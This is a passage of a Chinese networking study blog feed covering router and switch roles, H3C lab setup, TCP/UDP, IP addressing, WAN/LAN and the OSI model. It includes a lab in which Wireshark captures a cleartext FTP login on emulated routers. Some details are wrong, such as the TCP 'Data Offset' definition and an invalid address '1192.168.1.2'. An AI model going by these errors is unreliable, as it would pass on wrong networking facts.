        <content type="html"><![CDATA[<p style="text-align:center;color:#6950a1;font-size:1.5em;font-weight: bold;">路由器和交换机介绍<br /><p><img src="/images/IP%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/01.jpg"></p><p><strong>交换机</strong><code>是对接PC组成一个网段</code></p><p><strong>路由器</strong><code>把多个网段互联起来的设备</code></p><hr><p><em><strong>路由器的作用</strong></em></p><ul><li>连接具有不同介质的链路</li><li>连接网络或子网，隔离广播</li><li>对数据报文执行寻路和转发</li><li>交换和维护路由信息</li></ul><p><em><strong>路由器的特点</strong></em></p><ul><li>主要共工作在OSl模型的物理层、数据链路层和网络层</li><li>根据网络层信息进行路由转发</li><li>丰富的接口、链路层协议和多种路由协议</li></ul><hr><p><em><strong>交换机的作用</strong></em></p><ul><li>连接多个以太网物理段，隔离冲突域</li><li>对以太网帧进行高速而透明的交换转发</li><li>自行学习和维护MAC地址信息</li></ul><p><em><strong>交换机的特点</strong></em></p><ul><li>主要工作在OSl模型的物理层、数据链路层</li><li>提供以太网间的透明桥接和交换</li><li>依据链路层的MAC地址，将以太网数据帧在端口间进行转发</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H3C Cloud Lab 连接本地终端</title>
      <link href="/posts/53903"/>
      <url>/posts/53903</url>
      
        <content type="html"><![CDATA[<hr><p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B41.jpg"></p><hr><blockquote><p>版本：HCL_V2.1.2、VirtualBox-6.0.14-Win</p></blockquote><p>一：通过端口映射来进行连接</p><p><font size=3 face="楷体" color=#05841f>1.部署需要的设备</font></p><p><img src="/images/HCL%E8%BF%9E%E6%8E%A5%E6%9C%AC%E5%9C%B0%E7%BB%88%E7%AB%AF/01.jpg"></p><p><font size=3 face="楷体" color=#05841f>2.复制串口路径</font></p><p><img src="/images/HCL%E8%BF%9E%E6%8E%A5%E6%9C%AC%E5%9C%B0%E7%BB%88%E7%AB%AF/02.jpg"></p><p><font size=3 face="楷体" color=#05841f>3.利用piped作为端口映射</font></p><p><img src="/images/HCL%E8%BF%9E%E6%8E%A5%E6%9C%AC%E5%9C%B0%E7%BB%88%E7%AB%AF/03.jpg"></p><p><font size=3 face="楷体" color=#05841f>4.启动设备连接</font></p><p><img src="/images/HCL%E8%BF%9E%E6%8E%A5%E6%9C%AC%E5%9C%B0%E7%BB%88%E7%AB%AF/04.jpg" alt="1239"></p><hr><p>二：直接连接（前提CRT版本不能过低）</p><p><em><strong>SecureCRT连接模拟器</strong></em></p><p><code>复制路径</code></p><p><img src="/images/HCL%E8%BF%9E%E6%8E%A5%E6%9C%AC%E5%9C%B0%E7%BB%88%E7%AB%AF/02.jpg"></p><p><img src="/images/HCL%E8%BF%9E%E6%8E%A5%E6%9C%AC%E5%9C%B0%E7%BB%88%E7%AB%AF/05.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP和TCP抓包分析实验</title>
      <link href="/posts/22261"/>
      <url>/posts/22261</url>
      
        <content type="html"><![CDATA[<h1 id="IP和TCP抓包实验"><a href="#IP和TCP抓包实验" class="headerlink" title="IP和TCP抓包实验"></a>IP和TCP抓包实验</h1><hr><h2 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h2><p><img src="/images/IP%E5%92%8CTCP%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/01.jpg"></p><hr><h2 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h2><p>1.<strong>修改设备名称</strong><br><em>步骤1：在R1上进入系统视图，修改设备名称为R1</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;system-view </span><br><span class="line">System View: return to User View with Ctrl+Z.</span><br><span class="line">[H3C]sysname R1</span><br><span class="line">[R1]</span><br></pre></td></tr></table></figure><p><em>步骤2：在R2上进入系统视图，修改设备名称为R2</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;system-view </span><br><span class="line">System View: return to User View with Ctrl+Z.</span><br><span class="line">[H3C]sysname R2</span><br><span class="line">[R2]</span><br></pre></td></tr></table></figure><p>2.<strong>配置IP地址</strong></p><p><em>步骤1：在R1上进入g0&#x2F;0接口的接口视图，配置IP地址为<code>192.168.1.1/24</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]interface g0/0</span><br><span class="line">[R1-GigabitEthernet0/0]ip address 192.168.1.1 24</span><br></pre></td></tr></table></figure><p><em>步骤2：在R2上进入g0&#x2F;0接口的接口视图，配置IP地址为<code>192.168.1.2/24</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R2]interface g0/0</span><br><span class="line">[R2-GigabitEthernet0/0]ip address 1192.168.1.2 24</span><br></pre></td></tr></table></figure><p>3.<strong>开启抓包</strong></p><p><em>步骤1：右键点击R1和R2相连的链路，点击<code>开启抓包</code>，如图所示</em></p><p><img src="/images/IP%E5%92%8CTCP%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/02.jpg"></p><p>4.<strong>在R1上PING R2</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[R1]ping 192.168.1.2</span><br><span class="line">Ping 192.168.1.2 (192.168.1.2): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=0 ttl=255 time=1.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=1 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=2 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=3 ttl=255 time=0.000 ms</span><br><span class="line">56 bytes from 192.168.1.2: icmp_seq=4 ttl=255 time=0.000 ms</span><br><span class="line"></span><br><span class="line">--- Ping statistics for 192.168.1.2 ---</span><br></pre></td></tr></table></figure><p>5.<strong>开启Wireshark，查看抓取的Ping包内容</strong></p><p><em>步骤1：点开HCL右侧边栏，右键点击<code>GE0/0</code>接口，并点击<code>启动Wireshark</code>，如图所示</em></p><p><img src="/images/IP%E5%92%8CTCP%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/03.jpg"></p><p><em>步骤2：在Wireshark中可以看到抓到的数据包，紫色高亮的就是Ping包，如图所示</em></p><p><img src="/images/IP%E5%92%8CTCP%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/04.jpg"></p><p><em>步骤3：双击某个Ping包，查看数据包详细内容，展开<code>Internet Protocol Version 4</code>，可以查看到详细的IP头部格式，如图所示</em></p><p><img src="/images/IP%E5%92%8CTCP%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/05.jpg"></p><p>6.<strong>在R2上开启FTP服务，创建用户<code>wangdaye</code>，密码<code>123456</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[R2]ftp server enable </span><br><span class="line">[R2]local-user wangdaye class manage </span><br><span class="line">New local user added.</span><br><span class="line">[R2-luser-manage-wangdaye]password simple 123456</span><br><span class="line">[R2-luser-manage-wangdaye]authorization-attribute user-role level-15</span><br><span class="line">[R2-luser-manage-wangdaye]service-type ftp</span><br></pre></td></tr></table></figure><p>7.<strong>在R1上访问FTP服务，输入用户名和密码</strong></p><p><em>注意：FTP登录功能只能在用户视图下使用</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;R1&gt;ftp 192.168.1.2</span><br><span class="line">Press CTRL+C to abort.</span><br><span class="line">Connected to 192.168.1.2 (192.168.1.2).</span><br><span class="line">220 FTP service ready.</span><br><span class="line">User (192.168.1.2:(none)): wangdaye</span><br><span class="line">331 Password required for wangdaye.</span><br><span class="line">Password:</span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure><p>8.<strong>刷新Wireshark，发现已经抓取到FTP的登录名和密码，如图所示</strong></p><p><img src="/images/IP%E5%92%8CTCP%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/06.jpg"></p><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP和UDP原理</title>
      <link href="/posts/19954"/>
      <url>/posts/19954</url>
      
        <content type="html"><![CDATA[<br /><br /><h2 id="端口🏺"><a href="#端口🏺" class="headerlink" title="端口🏺"></a>端口🏺</h2><ul><li>每个应用程序进出网络都需要经过一个唯一端口，通过端口号来设别数据交由哪个应用程序处理</li><li>服务端：固定端口号</li><li>客户端：1024以上随机端口</li><li>常见知名端口<ul><li>TCP80   HTTP   超文本传输协议</li><li>TCP20   21    FTP     文件传输协议</li><li>TCP23    TELNET     远程</li><li>TCP25    SMTP    简单邮件传输协议</li><li>UDP53      DNS     域名解析协议</li><li>TCP443    HTTPS       HTTP over SSL</li></ul></li></ul><h2 id="TCP基本原理🗺️"><a href="#TCP基本原理🗺️" class="headerlink" title="TCP基本原理🗺️"></a>TCP基本原理🗺️</h2><h3 id="TCP头部封装格式"><a href="#TCP头部封装格式" class="headerlink" title="TCP头部封装格式"></a>TCP头部封装格式</h3><img src="/images/TCP和UDP原理/01.jpg" style="zoom:80%;" /><ul><li>Source Port:源端口</li><li>Destination Post:目的端口</li><li><strong>Seq</strong>uence Number:序列号标识本机发送的数据报文编号</li><li><strong>Ack</strong>nowledgement Number:确认号标识请求对方下次发送的数据报文编号</li><li>Data Offset:数据偏移标识数据分段在完整数据中的位置</li><li>Reserved:保留位</li><li>URG:紧急指针字段标志</li><li>ACK:确认字段标志</li><li>Psh:   直接提交缓存数据</li><li>RST:复位开关用于强行中断TCP连接，重设连接</li><li>Syn:握手开关，请求 ，同步序列号</li><li>Fin:结束开关，数据传输完毕</li><li>window:窗口尺寸用于通告本机的接收能力</li><li>Checksum:校验序列</li><li>Urgent Pointer:紧急指针</li><li>Options:可选项</li></ul><h3 id="TCP可靠性机制"><a href="#TCP可靠性机制" class="headerlink" title="TCP可靠性机制"></a>TCP可靠性机制</h3><p><em>确认机制</em>：</p><ul><li>seq&#x3D;上次ack</li><li>ACK&#x3D;上一次seq+length</li><li>如果没有接收到，或接收到的是不完整数据，会再次发送Ack请求对方重发</li></ul><p><em>三次握手</em>：</p><ul><li>第一次握手：建立连接时，客户端发送SYN包到服务器，进入发送状态，等待服务器确认<br>第二次握手：服务器收到后，发送ACK+SYN包，进入接收转态<br>第三次握手：客户端收到SYN+ACK包后，会发送ACK包，进入 established转态，完成三次握手</li></ul><p><em>四次挥手</em>：</p><ul><li>第一次挥手：客户端向服务器发送断开连接FIN 请求<br>第二次挥手：服务器收到请求后，回复客户端<br>第三次挥手：服务器发送完数据后，返回给客户端指令，说明自己可以断开了(最后一次完成的)<br>第四次挥手：客户端与服务端断开连接</li></ul><p><em>TCP特征：</em></p><p>优点：传输可靠性高</p><p>缺点：占用带宽高，传输延迟高</p><p>适用于对数据完整性要求高，但是对传输延迟要求低</p><h2 id="UDP基本原理🧭"><a href="#UDP基本原理🧭" class="headerlink" title="UDP基本原理🧭"></a>UDP基本原理🧭</h2><p><img src="/images/TCP%E5%92%8CUDP%E5%8E%9F%E7%90%86/02.jpg"></p><p><em>UDP特征：</em></p><p>优点：占用带宽低，传输延迟低</p><p>缺点：没有任何可靠性机制</p><p>适用于对传输延迟要求高，但数据完整性要求低</p><h2 id="TCP和UDP差别"><a href="#TCP和UDP差别" class="headerlink" title="TCP和UDP差别"></a>TCP和UDP差别</h2><p><img src="/images/TCP%E5%92%8CUDP%E5%8E%9F%E7%90%86/03.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP基本原理</title>
      <link href="/posts/63078"/>
      <url>/posts/63078</url>
      
        <content type="html"><![CDATA[<br /><br /><p><img src="/images/IP%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/01.jpg"></p><ul><li><p>交换机是对接PC组成一个网段</p></li><li><p>路由器是把多个网段互联起来的设备</p></li></ul><h1 id="IP的基本原理"><a href="#IP的基本原理" class="headerlink" title="IP的基本原理"></a>IP的基本原理</h1><h2 id="IP的定义"><a href="#IP的定义" class="headerlink" title="IP的定义 "></a><font size=4 face="黑体" color=#0000ff>IP的定义 </font></h2><ul><li><p>当前唯一的网络层协议标准</p></li><li><p>定义数据网络层的封装方式、编址方法</p></li></ul><h2 id="IP头部封装格式"><a href="#IP头部封装格式" class="headerlink" title="IP头部封装格式"></a><font size=4 face="黑体" color=#0000ff>IP头部封装格式</font></h2><p><img src="/images/IP%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/02.jpg"></p><blockquote><ol><li>版本 (Version):标明了IP协议的版本号，IPv4&#x2F;6。</li><li>头长度( Internet Header Length，lHL)：指IP包头部内容长度。</li><li>服务类型(Type of Service，ToS)：用于标志IP包期望获得的服务等级，常用于QoS(Quality of Service，服务质量）中。</li><li>总长度(Total Length)：整个IP包的长度，包括数据部分。</li><li>标识（Identification)：标识符，用于标识某个分片来自于那个数据包</li><li>标志(Flags)：保留、标识数据包是否禁止分片、标识是否为一个分片</li><li>分片偏移(Fragment offset)：用于描述分片在数据包中的位置</li><li>生存时间(Time to Live，TTL)：设置了数据包可以经过的路由器数目。一旦经过一个路由器，TTL值就会减1，当该字段值为0时，数据包将被丢弃。</li><li>协议(Protocol)：标识数据包内传送的数据所属的上层协议，IP用协议号区分上层协议。TCP协议的协议号为6，UDP协议的协议号为17。</li><li>头校验和(Head Checksum)：IP头部的校验和，用于检查包头的完整性。</li><li>源地址(Source Address）和目的地址（Destination Address)：分别标识数据包的源节点和目的节点的IP地址</li><li>可选项(Options) </li><li>填充(Padding)</li></ol></blockquote><p><img src="/images/IP%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/03.jpg"></p><h3 id="MTU"><a href="#MTU" class="headerlink" title="MTU"></a>MTU</h3><ul><li>最大传输单元，用来通知对方所能接受数据服务单元的最大尺寸，说明发送方能够接受的有效载荷大小</li><li>接口收发数据支持的单个包的最大长度</li><li>以太网接口默认MTU1500Byte</li><li>PPPoE默认MTU1492Byte</li></ul><h1 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ul><li>网络层地址</li></ul><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><ul><li>由32位长度，点分十进制 </li><li>由网络位+主机位组成 </li><li>网络位长度和数字完全一致的地址属于同一网段</li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><font size=5  color=#0000ff>IP地址分类用来划分不同的网络规模</font></p><ul><li><p>A类</p><ul><li>地址范围1.xxx-126.xxx</li><li>网络位划分 前8位为网络位，后24位位主机位</li></ul></li><li><p>B类</p><ul><li>地址范围128.x.x.x-191.x.x.x</li><li>网络位划分 前16位为网络位，后16位为主机位</li></ul></li><li><p>C类</p><ul><li>地址范围      192.x.x.x-223.x.x.x</li><li>网络位划分    前24位为网络位，后8位为主机位</li></ul></li><li><p>D类</p><ul><li><p>地址范围 224.x.x.x-239.x.x.x</p></li><li><p>作用组播地址，不可用于配置为主机地址</p></li></ul></li><li><p>E类</p><ul><li><p>地址范围240.x.x.x-255.x.x.x</p></li><li><p>作用科研用的地址，不对公开放</p></li></ul></li></ul><h2 id="特殊地址"><a href="#特殊地址" class="headerlink" title="特殊地址"></a>特殊地址</h2><ul><li>127.X.X.X本地环回地址，用于标识本机</li><li>主机位全0的地址网络地址，用来标识某个网段</li><li>主机位全1的地址本网段广播地址</li><li>255.255.255.255        全网广播地址</li><li>0.0.0.0           任意IP地址</li></ul><h2 id="公网-x2F-私网地址"><a href="#公网-x2F-私网地址" class="headerlink" title="公网&#x2F;私网地址"></a>公网&#x2F;私网地址</h2><h3 id="公网地址"><a href="#公网地址" class="headerlink" title="公网地址"></a>公网地址</h3><ul><li>可以在互联网上寻址的地址，全球唯一，需要运营商分配</li></ul><h3 id="私网地址"><a href="#私网地址" class="headerlink" title="私网地址"></a>私网地址</h3><p>定义：<font size=5  color=#0000ff>本地随意使用，无法在互联网上寻址</font></p><p>地址范围⤵️</p><ul><li>A类10.X.X.X</li><li>B类        172.16.X.X-172.31.X.X</li><li>C类        192.168.X.X</li><li>自动私有地址     169.254.X.X</li><li>运营商专用私有地址     100.64.X.X-100.127.X.X</li></ul><h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><p><strong>定义</strong>🔸</p><ul><li><font size=5  color=#0000ff>地址解析协议，把IP地址解析为MAC地址</font></li></ul><p><strong>工作原理</strong>🔸</p><p><img src="/images/IP%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/04.jpg"></p><ul><li>A主机以广播形式发送ARP查询请求，询问B主机的IP对应的MAC地址</li><li>B主机以单播形式回复A主机本机MAC地址</li><li>A主机把B主机的IP地址和MAC地址的映射关系写入ARP缓存表</li></ul><p><strong>相关命令</strong>🔸</p><ul><li>查看ARP缓存arp -a</li><li>清空ARP缓存    arp -d</li></ul><h1 id="RARP协议"><a href="#RARP协议" class="headerlink" title="RARP协议"></a>RARP协议</h1><ul><li>逆向地址解析协议</li><li>用于根据本机自己的MAC地址，查询本地自己的IP地址</li></ul><h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><ul><li><p>Ping      </p><ul><li>测试网络连通性</li></ul></li><li><p>Tracert     </p><ul><li>路由跟踪</li><li>H3C设备开启路由跟踪功能需要的前置命令<ul><li>ip ttl-expires enable</li><li>ip unreachables enable</li></ul></li></ul></li></ul><h1 id="IP数据转发原理"><a href="#IP数据转发原理" class="headerlink" title="IP数据转发原理"></a>IP数据转发原理</h1><ul><li>如果目的IP和本机IP属于同一网段，会直接查询目的IP的MAC地址，并进行封装</li><li>如果目的IP和本机IP不属于同一网段，会查询网关IP地址的MAC地址，并进行封装</li></ul><h1 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h1><ul><li>Gateway</li><li>本网段出口的IP地址</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>广域网基本原理</title>
      <link href="/posts/13172"/>
      <url>/posts/13172</url>
      
        <content type="html"><![CDATA[<br /><h1 id="广域网的作用"><a href="#广域网的作用" class="headerlink" title="广域网的作用"></a>广域网的作用</h1><p><img src="/images/%E5%B9%BF%E5%9F%9F%E7%BD%91%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/01.jpg"></p><ul><li>基于电信运营商的通信网络设施建立远程连接</li><li>在相距遥远的局域网之间建立连接性</li></ul><h1 id="协议及线缆"><a href="#协议及线缆" class="headerlink" title="协议及线缆"></a>协议及线缆</h1><p><font color=#00980f size=6 face="黑体">物理层</font></p><ul><li>串行线缆某些场景使用</li><li>光纤EPON</li></ul><p><font color=#00980f size=6 face="黑体">数据链路层</font></p><ul><li>HDLC淘汰</li><li>帧中继淘汰</li><li>PPP   某些场景使用，点到点协议</li><li>以太网某些场景使用</li></ul><p><font color=#00980f size=6 face="黑体">网络层</font></p><ul><li>IP唯一事实标准</li></ul><h1 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h1><p><font color=#095ff size=5 face="黑体">专线模式</font></p><ul><li>用户独占一条永久性、点对点、速率固定的专用线路独享带宽</li></ul><p><font color=#095ff size=6 face="黑体">电路交换方式</font></p><ul><li><p>用户设备之间连接是按需建立的，当用户需要发送数据时，运营商交换机就在主机端和端之间连通一条物理数据通路，当用户不再发数据时，运营商交换机即切断传输通路。</p></li><li><p>PSTH</p></li><li><p>ISDN    淘汰</p></li></ul><p><font color=#095ff size=6 face="黑体">分组交换方式</font></p><ul><li><p>用户设备将需要传输信息划分为一定长度的分组提交给运营商分组交换机，每个分组都载有接收方和发送方的地址标识，运营商分组交换依据这些地址标识将分组转发到目的端用户设备</p></li><li><p>帧中继  淘汰</p></li></ul><h1 id="广域网接入分类"><a href="#广域网接入分类" class="headerlink" title="广域网接入分类"></a>广域网接入分类</h1><ul><li>接入到互联网</li><li>远程连接到分支机构：高速专线、VPN</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>局域网基本原理</title>
      <link href="/posts/27533"/>
      <url>/posts/27533</url>
      
        <content type="html"><![CDATA[<br /><h1 id="局域网基本原理"><a href="#局域网基本原理" class="headerlink" title="局域网基本原理"></a>局域网基本原理</h1><h2 id="使用的协议及线缆"><a href="#使用的协议及线缆" class="headerlink" title="使用的协议及线缆"></a>使用的协议及线缆</h2><p><font color=#00980f size=6 face="黑体">物理层</font></p><ul><li>双绞线、同轴电缆、光纤、无线电</li></ul><p><font color=#095ff size=6 face="黑体">数据链路层</font></p><ul><li><p>以太网   唯一事实标准</p></li><li><p>令牌环淘汰</p></li><li><p>FDDl  光纤分布式接口  淘汰</p></li></ul><p><font color=#0c51FF size=6 face="黑体">网络层</font></p><ul><li>IP    唯一事实标准</li><li>IPX   淘汰</li><li>Apple talk   淘汰</li></ul><p><img src="/images/%E5%B1%80%E5%9F%9F%E7%BD%91%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/01.jpg"></p><h2 id="局域网设备"><a href="#局域网设备" class="headerlink" title="局域网设备"></a>局域网设备</h2><p><font size=5 face="楷体" color=#0000ff>集线器</font></p><ul><li>内部为总线型拓扑</li><li>任意时间只能由一台主机占用总线，连接的所有设备位于同一冲突域</li><li>工作在物理层，没有寻址能力，所有数据泛洪式转发</li><li>工作效率比较低</li></ul><p><font size=5 face="楷体" color=#0000ff>交换机</font></p><ul><li>内部每两个接口都有一个独立线路，每个接口都是独立的冲突域</li><li>工作在数据链路层，基于MAC地址寻址，数据可单点转发</li></ul><p><font size=5 face="楷体" color=#0000ff>冲突域</font></p><ul><li>设备发送数据会产生冲突的网络范围</li><li>集线器的所有接口在同一个冲突域</li><li>交换机的每个接口都是一个独立的冲突域</li></ul><p><font size=5 face="楷体" color=#0000ff>CSMA&#x2F;CD</font></p><ul><li>带冲突检测的载波侦听多路访问</li></ul><h2 id="局域网线缆"><a href="#局域网线缆" class="headerlink" title="局域网线缆"></a>局域网线缆</h2><h3 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h3><h4 id="线型↴"><a href="#线型↴" class="headerlink" title="线型↴"></a>线型↴</h4><ul><li><p>直连线：异类直连、两端线序一致(网线两端都是按T568A或T568B排序。例如：路由器和交换机或集线器之间)</p></li><li><p>交叉线：同类交叉、两端线序不一致(一端是T568A排序，一端是按T568B排序。例如：交换机与交换机之间)</p></li></ul><h4 id="线序↴"><a href="#线序↴" class="headerlink" title="线序↴"></a>线序↴</h4><p><font face="华文彩云" size=6 color=#ff0000>T568A：绿白，绿、橙白，蓝、蓝白，橙、棕白，棕</font></p><p><font face="华文彩云" size=6 color=#ff0000>T568B：橙白，橙、绿白，蓝、蓝白，绿、棕白，棕</font></p><h4 id="接口类型↴"><a href="#接口类型↴" class="headerlink" title="接口类型↴"></a>接口类型↴</h4><p>RJ-45、RJ-11</p><h3 id="光纤"><a href="#光纤" class="headerlink" title="光纤"></a>光纤</h3><p><font size=4 face="黑体" color=#0000ff>多模光纤</font></p><ul><li>纤芯较粗，可传递多种光源</li><li>传输距离短</li><li>成本低</li></ul><p><font size=4 face="黑体" color=#0000ff>单模光纤</font></p><ul><li>纤芯较细，只能传递单一光源</li><li>传输距离远</li><li>成本高</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSl参考模型与TCP/IP模型</title>
      <link href="/posts/31626"/>
      <url>/posts/31626</url>
      
        <content type="html"><![CDATA[<br/><h1 id="OSl参考模型"><a href="#OSl参考模型" class="headerlink" title="OSl参考模型"></a>OSl参考模型</h1><h2 id="产生背景"><a href="#产生背景" class="headerlink" title="产生背景"></a>产生背景</h2><ul><li>各大IT设备厂商只支持自己的私有协议，跨厂商设备兼容性差</li><li>用户购买和维护成本高</li><li>不利于网络技术发展</li></ul><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li>定义了网络中设备所遵守的层次结构</li></ul><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>开放的标准化接口，协议不再封闭</li><li>多厂商设备兼容</li><li>易于理解，学习和更新协议标准</li><li>实现模块化工程，降低开发难度</li><li>便于故障排除</li></ul><h2 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h2><p>7.<font size=5 face="华文琥珀" color=#0000ff>应用层</font>：为应用程序进程提供网络服务 </p><p>6.<font size=5 face="华文琥珀" color=#0000ff>表示层</font>：处理数据格式、数据加密等</p><p>5.<font size=5 face="华文琥珀" color=#0000ff>会话层</font>：建立、维护和管理应用程序的会话</p><p>4.<font size=5 face="华文琥珀" color=#0000ff>传输层</font>：数据分段、建立端到端连接、维护传输可靠性，</p><p>​端口用于区分同一台计算机上的不同应用程序</p><p>3.<font size=5 face="华文琥珀" color=#0000ff>网络层</font>：IP地址寻址和路由选择。</p><p><strong>IP寻址只是负责寻找的范围，MAC地址具体确认范围的个体</strong></p><p><strong>什么是路由？ 建立和维护两个范围之间的路径</strong></p><p>2.<font size=5 face="华文琥珀" color=#0000ff>数据链路层</font>：MAC地址寻址(通过寻址判断将数据传输给谁)</p><p>1.<font size=5 face="华文琥珀" color=#0000ff>物理层</font>：定义电压、接口、线缆标准、传输距离、传输介质等物理参数</p><p><img src="/../themes/butterfly/source/images/OSl%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B%E4%B8%8ETCPip%E6%A8%A1%E5%9E%8B/moxing.jpg"></p><h2 id="OSl参考模型的问题"><a href="#OSl参考模型的问题" class="headerlink" title="OSl参考模型的问题"></a>OSl参考模型的问题</h2><ul><li>划分层次过多，会话层、表示层存在意义不大</li><li>IP协议成为事实的网络层唯一协议</li></ul><h1 id="TCP-x2F-IP模型"><a href="#TCP-x2F-IP模型" class="headerlink" title="TCP&#x2F;IP模型"></a>TCP&#x2F;IP模型</h1><h2 id="五层划分"><a href="#五层划分" class="headerlink" title="五层划分"></a>五层划分</h2><p><font size=5 face="华文琥珀" color=#0000ff>1.物理层</font></p><p><font size=5 face="华文琥珀" color=#0000ff>2.数据链路层</font></p><p><font size=5 face="华文琥珀" color=#0000ff>3.网络层</font></p><p><font size=5 face="华文琥珀" color=#0000ff>4.传输层</font></p><p><font size=5 face="华文琥珀" color=#0000ff>5.应用层【会话层、表示层、应用层】</font> </p><h1 id="数据封装和解封装"><a href="#数据封装和解封装" class="headerlink" title="数据封装和解封装"></a>数据封装和解封装</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>封装：在原始数据的基础上加入一些额外信息形成新的格式</p><p>解封装：拆除掉封装的额外信息，还原成原始数据</p><h2 id="TCP-x2F-IP分层封装"><a href="#TCP-x2F-IP分层封装" class="headerlink" title="TCP&#x2F;IP分层封装"></a>TCP&#x2F;IP分层封装</h2><ol><li>物理层：比特流</li><li>数据链路层：数据帧</li><li>网络层：数据包</li><li>传输层：数据段</li><li>应用层：数据</li></ol><h2 id="过程"><a href="#过程" class="headerlink" 